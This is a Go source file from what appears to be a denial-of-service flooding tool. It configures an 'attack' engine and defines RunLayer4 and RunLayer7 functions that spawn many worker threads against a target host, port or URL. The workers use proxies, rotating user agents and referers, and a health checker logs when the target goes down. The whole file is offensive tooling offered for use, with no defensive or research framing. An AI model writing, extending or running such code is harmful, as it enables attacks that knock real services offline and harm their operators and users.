package core

import (
	"context"
)

// EngineOption is the Functional Options pattern for configuring an Engine.
// Callers compose only what they need; zero values are safe defaults.
type EngineOption func(*engineConfig)

type engineConfig struct {
	rateLimitPPS float64
	bandwidthBps int64
	healthURL    string
	healthCheck  bool
}

// WithRateLimit caps each worker at pps packets/requests per second.
func WithRateLimit(pps float64) EngineOption {
	return func(c *engineConfig) { c.rateLimitPPS = pps }
}

// WithBandwidthCap stops workers if outbound traffic exceeds bps bytes/sec.
func WithBandwidthCap(bps int64) EngineOption {
	return func(c *engineConfig) { c.bandwidthBps = bps }
}

// WithHealthCheck starts a target monitor that logs when the target goes down/up.
func WithHealthCheck(targetURL string) EngineOption {
	return func(c *engineConfig) {
		c.healthCheck = true
		c.healthURL = targetURL
	}
}

// NewEngine creates an Engine with the given options applied.
func NewEngine(opts ...EngineOption) *Engine {
	cfg := engineConfig{}
	for _, o := range opts {
		o(&cfg)
	}
	return &Engine{cfg: cfg}
}

// RunLayer4 builds and runs a Layer 4 attack via the factory, respecting engine options.
func RunLayer4(cfg Layer4Config, opts ...EngineOption) {
	e := NewEngine(opts...)
	factory := NewAttackFactory()
	worker := factory.Layer4Worker(
		cfg.Target, cfg.Port, cfg.Method,
		cfg.Refs, cfg.Proxies, cfg.ProtocolID,
	)

	// Decorator Pattern: wrap worker with rate limiter if requested
	if e.cfg.rateLimitPPS > 0 {
		rl := NewRateLimitedWorker(worker, e.cfg.rateLimitPPS)
		worker = rl.Run
	}

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	// Observer Pattern: health-check runs as independent goroutine
	if e.cfg.healthCheck {
		hc := NewHealthChecker(e.cfg.healthURL)
		go hc.Run(ctx)
	}

	e.Spawn(ctx, cfg.Threads, worker)
	statsLoop(ctx, cfg.Target, cfg.Method, int(cfg.Duration.Seconds()))
}

// RunLayer7 builds and runs a Layer 7 attack via the factory, respecting engine options.
func RunLayer7(cfg Layer7Config, opts ...EngineOption) {
	e := NewEngine(opts...)
	factory := NewAttackFactory()

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	if e.cfg.healthCheck {
		hc := NewHealthChecker(e.cfg.healthURL)
		go hc.Run(ctx)
	}

	for i := 0; i < cfg.Threads; i++ {
		worker := factory.Layer7Worker(
			cfg.TargetURL, cfg.Host, cfg.Method,
			cfg.RPC, cfg.UserAgents, cfg.Referers, cfg.Proxies, i,
		)
		if e.cfg.rateLimitPPS > 0 {
			rl := NewRateLimitedWorker(worker, e.cfg.rateLimitPPS)
			worker = rl.Run
		}
		e.Spawn(ctx, 1, worker)
	}
	statsLoop(ctx, cfg.TargetURL, cfg.Method, int(cfg.Duration.Seconds()))
}
